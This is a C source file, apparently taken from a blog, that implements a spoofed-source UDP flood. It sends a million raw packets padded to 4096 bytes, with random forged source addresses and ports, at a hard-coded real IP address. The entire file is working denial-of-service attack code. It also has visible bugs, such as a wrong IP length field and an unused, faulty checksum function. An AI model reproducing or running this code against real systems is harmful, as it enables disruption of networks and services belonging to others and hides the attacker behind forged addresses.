//http://www.noktec.be/archives/392
#include <stdio.h> // printf/fprintf
#include <stdlib.h>
#include <string.h> 

#include <netinet/ip.h> // struct ip
#include <sys/socket.h> // socket()
#include <netinet/in.h> // struct sockadd

#define __FAVOR_BSD
#define _USE_BSD
#include <netinet/udp.h> // struct udp

#define PADDING_SIZE 4096
#define N_LOOP 1000000
#define U_WAITING 10 

void udp(char *);
unsigned short int in_chksum (unsigned short int *, int);
unsigned long hasard(unsigned long, unsigned long);

main() {
srand(time(NULL));
int i;

for(i=0;i<N_LOOP;i++)
 {
 udp("117.27.250.200");
 usleep(U_WAITING);
 //printf("+");
 }
}

void udp(char *cible) {

int sd;
sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
if (sd == -1) {
fprintf(stderr,"socket() error, root ?\n");
}

unsigned long ip_src = hasard(4294967295/2,4294967295);
unsigned long ip_dst = inet_addr(cible);
unsigned short p_src = (unsigned short) hasard(0,65535);
unsigned short p_dst = (unsigned short) hasard(0,65535);

struct sockaddr_in sin;

sin.sin_family = AF_INET;
sin.sin_port = p_dst;
sin.sin_addr.s_addr = ip_dst; // dst

struct ip *ip;
struct udphdr *udp;
char *dgm, *data;

int pksize = sizeof(struct ip) + sizeof(struct udphdr) + PADDING_SIZE;
dgm = (char *) malloc(pksize);
ip = (struct ip *) dgm;
udp = (struct udphdr *) (dgm + sizeof(struct ip));
data = (char *) (dgm + sizeof(struct ip) + sizeof(struct udphdr));

memset(dgm, 0, pksize);
memcpy((char *) data, "G", PADDING_SIZE);

int un = 1;
if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *)&un, sizeof(un)) == -1)
 {
 fprintf(stderr,"setsockopt()");
 exit(-1);
 }

//entete ip

ip->ip_v = 4;
ip->ip_hl = 5;
ip->ip_tos = 0;
ip->ip_len = sizeof(pksize);
ip->ip_ttl = 255;
ip->ip_off = 0;
ip->ip_id = sizeof( 45 );
ip->ip_p = IPPROTO_UDP;
ip->ip_sum = 0; // a remplir aprés
ip->ip_src.s_addr = ip_src;
ip->ip_dst.s_addr = ip_dst;

//entete udp

udp->uh_sport = p_src;
udp->uh_dport = p_dst;
udp->uh_ulen = htons(sizeof(struct udphdr ) + PADDING_SIZE);
udp->uh_sum = 0;

// envoi
if (sendto(sd, dgm, pksize, 0, (struct sockaddr *) &sin,
 sizeof(struct sockaddr)) == -1) {
 fprintf(stderr,"oops, sendto() error\n");
 }

//libere la memoire
free(dgm);
close(sd);
}

u_short in_chksum (u_short *addr, int len) // taken from papasmurf.c
{
 register int nleft = len;
 register u_short *w = addr;
 register int sum = 0;
 u_short answer = 0;

 while (nleft > 1)
 {
 sum += *w++;
 nleft -= 2;
 }

 if (nleft == 1)
 {
 *(u_char *)(&answer) = *(u_char *)w;
 sum += answer;
 }

 sum = (sum >> 16) + (sum + 0xffff);
 sum += (sum >> 16);
 answer = ~sum;
 return(answer);
}

unsigned long hasard(unsigned long min, unsigned long max){
return (u_long) (min + ((float) rand() / RAND_MAX * (max - min + 1)));
}
